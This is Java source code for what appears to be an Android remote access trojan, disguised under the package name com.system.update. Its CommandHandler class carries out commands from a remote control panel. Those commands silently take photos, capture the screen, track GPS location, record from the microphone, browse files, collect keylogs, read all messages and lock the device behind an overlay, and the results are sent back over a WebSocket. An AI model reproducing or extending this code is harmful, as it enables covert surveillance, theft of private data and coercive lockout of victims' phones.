package com.system.update;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;

public class CommandHandler {
    private Context context;
    private String uuid;
    private ScreenCapture screenCap;
    private CameraHelper camera;
    private GPSHelper gps;
    private MicrophoneHelper mic;
    private FileExplorer fileExplorer;
    private KeyLogger keyLogger;
    private MessageReader messageReader;
    private LockdownOverlay lockdown;

    public CommandHandler(Context context, String uuid) {
        this.context = context;
        this.uuid = uuid;
        screenCap = new ScreenCapture(context);
        camera = new CameraHelper(context);
        gps = new GPSHelper(context);
        mic = new MicrophoneHelper(context);
        fileExplorer = new FileExplorer(context);
        keyLogger = new KeyLogger(context);
        messageReader = new MessageReader(context);
        lockdown = new LockdownOverlay(context);
    }

    public void execute(int cmdId, String command, JSONObject params) {
        Log.i("CommandHandler", "Executing: " + command);
        JSONObject result = new JSONObject();
        try {
            switch (command) {
                case "screenshot":
                    result.put("data", screenCap.capture());
                    break;
                case "camera":
                    result.put("data", camera.captureSilent(params.optString("camera", "back")));
                    break;
                case "gps":
                    result.put("data", gps.getLocation());
                    break;
                case "mic":
                    result.put("data", mic.record(params.optInt("duration", 10)));
                    break;
                case "file_explorer":
                    result.put("data", fileExplorer.list(params.optString("path", "/")));
                    break;
                case "lockdown":
                    lockdown.activate(params.optString("message", "Device locked by admin"));
                    result.put("status", "locked");
                    break;
                case "keylog":
                    result.put("data", keyLogger.getLogs());
                    break;
                case "read_messages":
                    result.put("data", messageReader.readAll());
                    break;
                default:
                    result.put("error", "Unknown command");
            }
            sendResult(cmdId, result, command);
        } catch (Exception e) {
            Log.e("CommandHandler", "Error", e);
            try {
                result.put("error", e.getMessage());
                sendResult(cmdId, result, command);
            } catch (Exception ex) { /* ignore */ }
        }
    }

    private void sendResult(int cmdId, JSONObject result, String type) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("command_id", cmdId);
            payload.put("result", result);
            payload.put("type", type);
            payload.put("target_uuid", uuid);
            // Kirim via WebSocket (disimpan di UpdateService) - implementasi sederhana
            // Idealnya gunakan singleton atau interface callback
            // Di sini kita asumsikan ada metode static atau event bus
            UpdateService.sendResultToPanel(payload); // kita tambahkan method static di UpdateService
        } catch (Exception e) {
            Log.e("CommandHandler", "Send result error", e);
        }
    }
}
